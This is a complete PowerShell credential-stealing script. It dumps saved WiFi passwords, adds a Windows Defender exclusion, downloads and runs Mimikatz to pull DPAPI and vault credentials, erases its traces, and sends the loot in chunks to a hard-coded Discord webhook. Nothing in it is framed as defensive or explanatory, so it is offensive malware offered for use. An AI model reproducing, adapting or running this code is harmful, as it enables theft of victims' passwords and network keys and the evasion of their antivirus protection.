# Discord Webhook
$webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"

# Get PC info
$pc = "$env:COMPUTERNAME | $env:USERNAME"

# === WiFi Passwords ===
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
$wifi = ""
foreach($name in $wifiProfiles) {
    $profileInfo = netsh wlan show profile name="$name" key=clear
    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
    if($passLine) {
        $pass = $passLine.Matches.Groups[1].Value.Trim()
        $wifi += "$name : $pass`n"
    }
}
if(-not $wifi) { $wifi = "No WiFi networks found" }

# === Browser Passwords ===
$tempDir = "$env:TEMP\mk_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

try {
    # Add temp directory to Windows Defender exclusion
    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
    
    # Download Mimikatz
    $mimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
    $zipPath = "$tempDir\mk.zip"
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $mimikatzUrl -OutFile $zipPath -UseBasicParsing
    
    # Extract
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
    
    # Find the x64 mimikatz
    $mkPath = "$tempDir\x64\mimikatz.exe"
    
    if(Test-Path $mkPath) {
        # Run Mimikatz to dump Chrome/Edge credentials
        $commands = @"
privilege::debug
sekurlsa::dpapi
vault::list
exit
"@
        
        $commandFile = "$tempDir\commands.txt"
        $commands | Out-File -FilePath $commandFile -Encoding ASCII
        
        $result = & $mkPath "`"log $tempDir\output.txt`"" "`"$commandFile`"" 2>&1 | Out-String
        
        # Read the output
        $outputFile = "$tempDir\output.txt"
        if(Test-Path $outputFile) {
            $mkOutput = Get-Content $outputFile -Raw
            
            # Parse for credentials
            $browsers = "=== Mimikatz Output ===`n"
            
            # Extract DPAPI masterkeys and credentials
            if($mkOutput -match "domain|username|password") {
                $browsers += $mkOutput
            } else {
                $browsers = "Mimikatz ran but no credentials found in memory"
            }
        } else {
            $browsers = "Mimikatz executed but no output file created"
        }
    } else {
        $browsers = "Mimikatz executable not found after extraction"
    }
} catch {
    $browsers = "Error: $($_.Exception.Message)"
}

# Clean up
Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# === Format and Send ===
$output = @"
**PC: $pc**

**=== WiFi Networks ===**
$wifi

**=== Browser Passwords ===**
$browsers
"@

# Split into chunks if too long (Discord has 2000 char limit)
$maxLen = 1900
if($output.Length -gt $maxLen) {
    for($i = 0; $i -lt $output.Length; $i += $maxLen) {
        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
        $body = @{ content = $chunk } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
        Start-Sleep -Milliseconds 500
    }
} else {
    $body = @{ content = $output } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
}
